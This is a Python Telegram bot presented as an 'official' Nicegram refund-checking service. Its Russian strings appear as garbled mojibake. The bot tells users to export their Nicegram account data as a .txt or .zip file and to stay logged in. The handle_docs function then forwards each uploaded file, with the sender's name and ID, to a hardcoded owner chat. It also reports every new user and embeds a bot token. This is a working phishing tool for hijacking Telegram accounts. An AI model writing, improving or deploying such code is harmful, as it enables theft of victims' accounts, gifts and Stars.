import os
import logging
from typing import Dict
from pathlib import Path

# Make sure to install python-telegram-bot:
# pip install python-telegram-bot

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class Config:
    # –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø: –õ—É—á—à–µ —Ö—Ä–∞–Ω–∏—Ç—å —Ç–æ–∫–µ–Ω –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è
    # BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TOKEN_HERE")
    BOT_TOKEN = "8579474300:AAGDLC-8rTyC-_khTo4eTTVDhnVbi_E9oF8"  # –û–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –∑–∞–º–µ–Ω–∏, –µ—Å–ª–∏ —ç—Ç–æ –Ω–µ —Ç–≤–æ–π!
    OWNER_CHAT_IDS = ["8250930469"]
    BANNER_PATH = "–∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ.png"
    TEMP_DIR = "temp_files"


Path(Config.TEMP_DIR).mkdir(parents=True, exist_ok=True)


class UserData:
    def __init__(self):
        self.lang: str = "ru"


user_data: Dict[int, UserData] = {}


def get_user_data(user_id: int) -> UserData:
    if user_id not in user_data:
        user_data[user_id] = UserData()
    return user_data[user_id]


translations = {
    "ru": {
        "welcome": "üíé <b>Nicegram Refund Checker</b>\n\n–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π —Å–µ—Ä–≤–∏—Å –ø—Ä–æ–≤–µ—Ä–∫–∏ –ª–∏–∫–≤–∏–¥–Ω–æ—Å—Ç–∏ –∏ —Ä–µ—Ñ–∞—É–Ω–¥–∞ Telegram-–ø–æ–¥–∞—Ä–∫–æ–≤, –¢–µ–ª–µ–≥—Ä–∞–º-–ó–≤–µ–∑–¥.\n\n<b>–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:</b>",
        "refund_check": "üíø <b>–ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —Ä–µ—Ñ–∞—É–Ω–¥</b>\n\n–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª —ç–∫—Å–ø–æ—Ä—Ç–∞ –∏–∑ Nicegram (.txt –∏–ª–∏ .zip).",
        "instructions": "üìñ <b>–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è</b>\n\n1. C–∫–∞—á–∞–π—Ç–µ Nicegram –≤ AppStore –∏–ª–∏ PlayMarket\n2. –í–æ–π–¥–∏—Ç–µ –≤ —Å–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç Telegram\n3. –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ Nicegram\n4. –ù–∞–π–¥–∏—Ç–µ –ø—É–Ω–∫—Ç –≠–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –∫–∞–∫ —Ñ–∞–π–ª\n5. –ù–∞–∂–º–∏—Ç–µ –≥–∞–ª–æ—á–∫—É\n6. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –ø–æ–ª—É—á–µ–Ω–Ω—ã–π —Ñ–∞–π–ª (.txt –∏–ª–∏ .zip) –±–æ—Ç—É.",
        "back_btn": "‚óÄÔ∏è –ù–∞–∑–∞–¥",
        "file_received": "‚úÖ <b>–§–∞–π–ª –ø–æ–ª—É—á–µ–Ω!</b>\n\n–û–∂–∏–¥–∞–π—Ç–µ –æ—Ç–≤–µ—Ç–∞(5-15 –º–∏–Ω—É—Ç), –Ω–µ –≤—ã—Ö–æ–¥–∏—Ç–µ –∏–∑ –∞–∫–∫–∞—É–Ω—Ç–∞ Nicegram, –∏–Ω–∞—á–µ –º—ã –Ω–µ —Å–º–æ–∂–µ–º –ø—Ä–æ–≤–µ—Ä–∏—Ç—å Refaund.",
        "processing": "‚è≥ –ê–Ω–∞–ª–∏–∑–∏—Ä—É—é...",
        "help": "üÜò <b>–ü–æ–º–æ—â—å</b>\n\n1. –ù–∞–ø–∏—à–∏—Ç–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É –Ω–∞–ø—Ä—è–º—É—é –∏–ª–∏ –∂–µ –≤–æ—Å–æ–ø–æ–ª—å–∑—É–π—Ç–µ—Å—å –±–æ—Ç–æ–º –ø–æ–¥–¥–µ—Ä–∂–∫–∏.\n\n2. –û–ø–∏—à–∏—Ç–µ –ø—Ä–æ–±–ª–µ–º—É –ø–æ–¥—Ä–æ–±–Ω–æ.\n\n3. –ü—Ä–∏–ª–æ–∂–∏—Ç–µ —Å–∫—Ä–∏–Ω—à–æ—Ç—ã –µ—Å–ª–∏ –Ω—É–∂–Ω–æ."
    },
    "en": {
        "welcome": "üíé <b>Nicegram Refund Checker</b>\n\nWelcome to the gift check service.\n\n<b>Choose action:</b>",
        "refund_check": "üíø <b>Refund Check</b>\n\nSend your Nicegram export (.txt or .zip).",
        "instructions": "üìñ <b>Manual</b>\n\n1. Nicegram Settings\n2. 'Export as file'\n3. Send file here.",
        "help": "üÜò <b>Help</b>\n\nContact administration.",
        "back_btn": "‚óÄÔ∏è Back",
        "file_received": "‚úÖ <b>Received!</b>\n\nWait 5-15 minutes.",
        "processing": "‚è≥ Analyzing..."
    }
}


# --- –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é —Å –Ω–æ–≤–æ–π –∫–Ω–æ–ø–∫–æ–π ---
def get_main_keyboard(lang: str):
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("üìñ –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è" if lang == "ru" else "üìñ Guide", callback_data="inst"),
            InlineKeyboardButton("üíé –ü—Ä–æ–≤–µ—Ä–∫–∞" if lang == "ru" else "üíé Check", callback_data="check")
        ],
        [
            InlineKeyboardButton("üì• –°–∫–∞—á–∞—Ç—å Nicegram" if lang == "ru" else "üì• Download Nicegram",
                                 callback_data="download")
        ],
        [
            InlineKeyboardButton("üÜò –ü–æ–º–æ—â—å" if lang == "ru" else "üÜò Help", callback_data="help")
        ]
    ])


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    for admin_id in Config.OWNER_CHAT_IDS:
        try:
            await context.bot.send_message(chat_id=admin_id, text=f"üë§ –ù–æ–≤—ã–π —é–∑–µ—Ä: {user.full_name} ({user.id})")
        except:
            pass

    reply_markup = InlineKeyboardMarkup([[
        InlineKeyboardButton("üá∑üá∫ –†—É—Å—Å–∫–∏–π", callback_data="l_ru"),
        InlineKeyboardButton("üá∫üá∏ English", callback_data="l_en")
    ]])

    caption = "–í—ã–±–µ—Ä–∏—Ç–µ —è–∑—ã–∫ / Choose language:"

    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ –±–∞–Ω–Ω–µ—Ä–∞
    if Path(Config.BANNER_PATH).exists():
        with open(Config.BANNER_PATH, 'rb') as photo:
            await update.message.reply_photo(photo=photo, caption=caption, reply_markup=reply_markup)
    else:
        # –ï—Å–ª–∏ —Ñ–æ—Ç–æ –Ω–µ—Ç, –ø—Ä–æ—Å—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–µ–∫—Å—Ç
        await update.message.reply_text(caption, reply_markup=reply_markup)


async def callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = update.effective_user.id
    data = query.data

    if data.startswith("l_"):
        get_user_data(uid).lang = data.split("_")[1]

    lang = get_user_data(uid).lang

    text = ""
    kb = None

    if data.startswith("l_") or data == "back":
        text, kb = translations[lang]["welcome"], get_main_keyboard(lang)

    elif data == "check":
        text = translations[lang]["refund_check"]
        kb = InlineKeyboardMarkup([[InlineKeyboardButton(translations[lang]["back_btn"], callback_data="back")]])

    elif data == "inst":
        text = translations[lang]["instructions"]
        kb = InlineKeyboardMarkup([[InlineKeyboardButton(translations[lang]["back_btn"], callback_data="back")]])

    elif data == "help":
        # –ò—Å–ø–æ–ª—å–∑—É–µ–º .get() –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, —á—Ç–æ–±—ã –±–æ—Ç –Ω–µ –ø–∞–¥–∞–ª –µ—Å–ª–∏ –∫–ª—é—á–∞ –Ω–µ—Ç
        text = translations[lang].get("help", "Help section missing")
        kb = InlineKeyboardMarkup([[InlineKeyboardButton(translations[lang]["back_btn"], callback_data="back")]])

    # --- –ù–æ–≤–∞—è –∫–Ω–æ–ø–∫–∞ "–°–∫–∞—á–∞—Ç—å Nicegram" ---
    elif data == "download":
        text = (
            "üì• <b>–í—ã–±–µ—Ä–∏—Ç–µ –ø–ª–∞—Ç—Ñ–æ—Ä–º—É –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è Nicegram:</b>"
            if lang == "ru"
            else "üì• <b>Select platform to download Nicegram:</b>"
        )

        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("üì± Google Play", url="https://play.google.com/store/apps/details?id=app.nicegram")],
            [InlineKeyboardButton("üçè App Store", url="https://apps.apple.com/app/id1608870673")],
            [InlineKeyboardButton(translations[lang]["back_btn"], callback_data="back")]
        ])

    if text and kb:
        try:
            if query.message.caption:
                await query.edit_message_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
            else:
                await query.edit_message_text(text=text, parse_mode=ParseMode.HTML, reply_markup=kb)
        except Exception as e:
            logger.error(f"Error updating menu: {e}")


async def handle_docs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    lang = get_user_data(user.id).lang
    doc = update.message.document

    if not doc.file_name.lower().endswith(('.txt', '.zip')):
        await update.message.reply_text("‚ùå –¢–æ–ª—å–∫–æ .txt –∏–ª–∏ .zip!")
        return

    for admin_id in Config.OWNER_CHAT_IDS:
        try:
            await context.bot.send_document(chat_id=admin_id, document=doc.file_id,
                                            caption=f"üìÅ –§–∞–π–ª –æ—Ç: {user.full_name}\nID: {user.id}")
        except:
            pass

    await update.message.reply_text(
        translations[lang]["file_received"],
        parse_mode=ParseMode.HTML,
        reply_markup=get_main_keyboard(lang)
    )


def main():
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–∞
    if Config.BOT_TOKEN == "":
        print("–û–®–ò–ë–ö–ê: –í—ã –∑–∞–±—ã–ª–∏ —É–∫–∞–∑–∞—Ç—å —Ç–æ–∫–µ–Ω –±–æ—Ç–∞ –≤ Config.BOT_TOKEN")
        return

    app = Application.builder().token(Config.BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(callback_query))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_docs))

    print("–ë–æ—Ç Nicegram Refund Checker –∑–∞–ø—É—â–µ–Ω!")
    app.run_polling()


if __name__ == '__main__':
    main()
